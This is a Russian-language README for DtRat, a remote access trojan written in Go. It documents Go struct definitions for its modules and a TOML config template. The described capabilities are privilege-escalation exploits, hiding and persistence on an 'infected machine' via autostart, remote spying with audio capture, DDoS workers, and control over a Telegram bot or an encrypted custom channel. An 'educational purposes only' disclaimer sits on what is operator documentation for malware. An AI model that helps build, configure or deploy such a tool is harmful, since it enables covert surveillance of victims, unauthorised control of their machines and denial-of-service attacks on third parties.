## DtRat
> Внимание!
> Проект на стадии разработки, многий функционал ещё не реализован, существующий может поменяться. Могут быть несоответствия README с кодом.

Это RAT система от XdX Team, полностью написанная на Go. **Используйте исключительно в образовательных целях!**
## [Характеристики](#характеристики)
Весь проект собирается в один исполняемый файл под необходимую ОС:
- Windows
- Linux

Рядом должен находиться файл конфигурации (см. [Конфиг](#config)). Остальные зависимости различаются на разных ОС:
- Windows - установленный Microsoft edge
- Linux - нет зависимостей
## Использование
Выберете реализацию транспортного слоя который будет использоваться для связи. Для этого поменяйте `Use_transport` в `config.toml`, на `telegram` или `arcanum`, и настройте выбранный транспорт.

Для использования DtRat через Arcanum, используйте DrHub.

Для получения доступных команд напишите /help запущенному DtRat или загляните в `rat/help.go`
# Документация
Далее базовая документация по основным структурам и типам ратника
## [Rat](#rat) - Основная структура 
```
type Rat struct {
    Transport transport.Transport
    Engine    *engine.Engine
    Exploiter *exploiter.Exploiter
    Hider     *hider.Hider
    Spy       *spy.Spy

    isRunning atomic.Bool
    Config    config.Config
    CloseCh   chan (error)
}
```
Это основной тип содержащий в себе основные модули:
- `transport.Transport` - Интерфейс транспортного слоя.
- `engine.Engine` - Реализует логику выполняемых команд, подробнее в [Engine](#engine).
- `exploiter.Exploiter` - Модуль содержащий в себе логику эксплойтов (см. [Эксплойты](#эксплойты)), позволяющих повысить привелегии процесса на различных ОС (см. [Характеристики](#характеристики)).
- `hider.Hider` - реализует автоматическое скрытие и закрепление на заражённой машине, добавляя себя в автозапуск и т.д.
- `spy.Spy` - Модуль содержащий инструменты удаленной слежки, подробнее в [Spy](#spy).
- `config.Config` - Структура хранящая информацию из файла конфигурации, подробнее в [Config](#config).
- `CloseCh` - Канал возвращающий ошибку, нужен для ожидания завершения работы в main.

## [Engine](#engine)
```
type Engine struct {
    System *system.System
    Info   *info.Info
    Media  *media.Media
} 
```
Engine отвечает за выполнение основных команд, и сам в свою очередь состоит из нескольких элементов, каждый из которых отвечает за свой функционал:
- `system.System` - отвечает за команды работающие с ОС
- `info.Info` - отвечает за команды которые вытягивают полезную информацию 
- `media.Media` - отвечает за команды связанные с медиа контентом

Весь код находится в `engine/`

## [Config](#config)
DtRat реализует разные способы хранения конфига, он может хранится как в открытом виде, так и зашифрованным или быть скомпилированным вместе с бинарником. Настроить это можно только перед компиляцией, поменяв константу `UseStorage` в `config/config.go` .

Вся конфигурации происходит в формате `toml`:
```
# Основные настройки
[General]
Agent_name = "Tester" # Имя этого ратника, ставьте разные для разных машин
Use_transport = "telegram" # Выбранный транспорт

# Настройки связанные с выполнением команд
[Engine]
Sample_rate = 44100 # Частота дискретизации аудио
DDoS_workers = 100 # Количество воркеров для ддос атаки, ставить больше имеет смысл только при мощном процессоре у машины

# Настройка связи через телеграмм бота
[Transport.Telegram]
Token = "" #Токен бота
User_id = "" Ваш id из ТГ, только вы можете управлять ратником через бота

# Настройка Arcanum
[Transport.Arcanum]
Addr = "localhost:8080" # Адрес для подключения 
Secret = "xdx" # Ключ для шифрования траффика
```
